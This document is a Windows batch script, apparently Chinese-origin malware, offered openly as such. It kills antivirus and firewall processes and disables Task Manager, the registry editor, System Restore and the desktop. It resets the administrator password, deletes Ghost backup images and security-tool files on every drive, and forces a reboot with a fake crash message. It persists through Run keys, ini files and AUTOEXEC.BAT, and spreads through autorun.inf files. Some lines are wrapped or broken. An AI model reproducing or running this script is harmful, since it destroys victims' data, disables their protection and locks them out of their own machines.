[[bat]]
@echo off 
title You DEAD!!!!!!! 
set taskkill=s 
copy %0 %windir%\system32\cmd.bat 
attrib %windir%\system32\cmd.bat +r +s +h 
net stop sharedaccess >nul 
%s% /im pfw.exe shadowtip.exe shadowservice.exe qq.exe explorer.exe 
IEXOLORE.EXE /f >nul 
%s% /im norton* /f >nul 
%s% /im av* /f >nul 
%s% /im fire* /f >nul 
%s% /im anti* /f >nul 
%s% /im spy* /f >nul 
%s% /im bullguard /f >nul 
%s% /im PersFw /f >nul 
%s% /im KAV* /f >nul 
%s% /im ZONEALARM /f >nul 
%s% /im SAFEWEB /f >nul 
%s% /im OUTPOST /f >nul 
%s% /im nv* /f >nul 
%s% /im nav* /f >nul 
%s% /im F-* /f >nul 
%s% /im ESAFE /f >nul 
%s% /im cle /f >nul 
%s% /im BLACKICE /f >nul 
%s% /im def* /f >nul 
%s% /im 360safe.exe /f >nul 
net stop Shadow" "System" "Service 
set alldrive=d e f g h i j k l m n o p q r s t u v w x y z 
for %%a in (c %alldrive%) do del %%a:\360* /f /s /q >nul 
for %%a in (c %alldrive%) do del %%a:\修复* /f /s /q >nul 
rem 修改注册表....... 
REG ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\explorer 
\Advanced\Folder\Hidden\SHOWALL /v  
CheckedValue /t REG_DWORD /d 00000000 /f >nul 
REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies 
\Explorer /v NoRun /t REG_DWORD /d  
00000001 /f >nul 
REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies 
\Explorer /v NoRecentDocsMenu /t  
REG_DWORD /d 00000001 /f >nul 
REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies 
\Explorer /v NoDrives /t REG_DWORD /d  
4294967295 /f >nul 
REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies 
\System /v Disableregistrytools /t  
REG_DWORD /d 00000002 /f >nul 
REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies 
\Explorer /v NoNetHood /t REG_DWORD /d  
00000001 /f >nul 
REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies 
\Explorer /V NoDesktop /t REG_DWORD /d  
00000001 /f >nul 
REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies 
\Explorer /v NoClose /t REG_DWORD /d  
00000001 /f >nul 
REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies 
\Explorer /v NoFind /t REG_DWORD /d  
00000001 /f >nul 
REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies 
\System /v DisableTaskMgr /t REG_DWORD  
/d 00000001 /f >nul 
REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies 
\Explorer /v NoLogOff /t REG_DWORD /d  
00000001 /f >nul 
REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies 
\Explorer /v NoSetTaskBar /t REG_DWORD  
/d 00000001 /f >nul 
REG ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows" "NT\CurrentVersion\SystemRestore  
/v DisableSR /t REG_DWORD /d  
00000001 /f >nul 
REG ADD HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows" "NT\SystemRestore  
/v DisableConfig /t REG_DWORD /d  
00000001 /f >nul 
REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies 
\Explorer /v RestrictRun /t REG_DWORD /d  

00000001 /f >nul 
cls 
net user administrator 123456 >nul 
for %%c in (c %alldrive%) do del %%c:\*.gho /f /s /q >nul 
echo @echo off >d:\setup.bat 
echo shutdown -r -t 10 -f -c 亲爱的朋友，我十分抱歉的通知你，你的电脑已经严重崩溃，请重新 
安装系统可以解决此问题 
!^.^ >>d:\setup.bat 
echo copy d:\setup.bat c:\Documents" "and" "Settings\All" "Users\「开始」菜单\程序\启动 
\a.bat >>d:\setup.bat 
echo REG ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v  
setup.bat /t REG_SZ /d d:\setup.bat  
/f >>d:\setup.bat 
echo REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v  
setup.bat /t REG_SZ /d d:\setup.bat  
/f >>d:\setup.bat 
echo REG ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce /v  
setup.bat /t REG_SZ /d d:\setup.bat  
/f >>d:\setup.bat 
HKEY_CLASSES_ROOT\batfile\shell\open\command /v setup.bat /t REG_SZ /d d:\setup.bat /f  
>>d:\setup.bat 
echo [windows] >> %windir%\win.ini 
echo run=d:\setup.bat C:\AUTOEXEC.BAT >> %windir%\win.ini 
echo load=d:\setup.bat C:\AUTOEXEC.BAT >> %windir%\win.ini 
echo [boot] >> %windir%\system.ini 
echo shell=explorer.exe setup.bat C:\AUTOEXEC.BAT >> %windir%\system.ini 
echo [AutoRun] >d:\autorun.inf 
echo Open=setup.bat >>d:\autorun.inf 
echo Open=system.bat >>d:\autorun.inf 
attrib d:\autorun.inf +r +s +h >>d:\setup.bat 
attrib d:\setup.bat +r +s +h >>d:\setup.bat 
start d:\setup.bat /min >nul 
echo @echo off >>C:\AUTOEXEC.BAT 
echo REG ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v  
AUTOEXEC.BAT /t REG_SZ /d  
C:\AUTOEXEC.BAT /f >>C:\AUTOEXEC.BAT 
echo REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v  
AUTOEXEC.BAT /t REG_SZ /d  
C:\AUTOEXEC.BAT /f >>C:\AUTOEXEC.BAT 
REG ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce /v  
AUTOEXEC.BAT /t REG_SZ /d  
C:\AUTOEXEC.BAT /f >>C:\AUTOEXEC.BAT 
echo REG ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v  
setup.bat /t REG_SZ /d d:\setup.bat  
/f >>C:\AUTOEXEC.BAT 
echo REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v  
setup.bat /t REG_SZ /d d:\setup.bat  
/f >>C:\AUTOEXEC.BAT 
REG ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce /v  
setup.bat /t REG_SZ /d d:\setup.bat  
/f >>C:\AUTOEXEC.BAT 
echo if not d:\setup.bat start %windir%\system32\cmd.bat /min >>C:\AUTOEXEC.BAT 
copy %0 %systemroot%\windows.bat >nul 
if not exist %windir%/system32/explorer.bat @echo off >>%windir%/system32 
/explorer.bat 
if not exist C:\AUTOEXEC.BAT start %windir%\system32\cmd.bat /min >>% 
windir%/system32/explorer.bat 
if not exist %windir%\system32\cmd.bat start %systemroot%\windows.bat /min >>% 
windir%/system32/explorer.bat 
echo REG ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v  
AUTOEXEC.BAT /t REG_SZ /d  
C:\AUTOEXEC.BAT /f >>%windir%/system32/explorer.bat 
echo REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v  
AUTOEXEC.BAT /t REG_SZ /d  
C:\AUTOEXEC.BAT /f >>%windir%/system32/explorer.bat 
echo REG ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v  
setup.bat /t REG_SZ /d d:\setup.bat  
/f >>%windir%/system32/explorer.bat 
echo REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v  
setup.bat /t REG_SZ /d d:\setup.bat  
/f >>%windir%/system32/explorer.bat 
echo REG ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v  
explorer.bat /t REG_SZ /d % 
windir%/system32/explorer.bat/f >>%windir%/system32/explorer.bat 
echo REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v  
explorer.bat /t REG_SZ /d % 
windir%/system32/explorer.bat /f >>%windir%/system32/explorer.bat 
echo start %systemroot%\windows.bat /min >>%windir%/system32/explorer.bat 
attrib %windir%/system32/explorer.bat +r +s +h% 
attrib %systemroot%/windows.bat +r +s +h 
for %%c in (%alldrive%) do echo @echo off >>%%c:\system.bat 
for %%c in (%alldrive%) do echo start %windir%\system32\cmd.bat /min  
>>%%c:\system.bat 
for %%c in (%alldrive%) do echo attrib system.bat +r +s +h >>%%c:\system.bat 
set drive=e f g h i j k l m n o p q r s t u v w x y z 
for %%c in (%drive%) do echo [AuroRun] >%%c:\autorun.inf 
for %%c in (%drive%) do echo Open=system.bat >>%%c:\autorun.inf 
copy %0 d:\Program" "Files\run.bat 
for %%c in (%alldrive%) do echo if not exist %windir%/system32/explorer.bat start  
d:\Program" "Files\run.bat /min  
>>%%c:\system.bat 
for %%c in (%alldrive%) do attrib autorun.inf +r +s +h >>%%c:\system.bat 
for %%c in (%alldrive%) do attrib %%c:\autorun.inf +r +s +h >nul 
for %%c in (%alldrive%) do attrib %%c:\system.bat +r +s +h >nul 
if not exist %windir%/system32/explorer.bat start d:\Program" "Files\run.bat 
/min >>d:\setup.bat 
attrib d:\Program" "Files\run.bat +r +s +h >nul 
del %0 
exit  
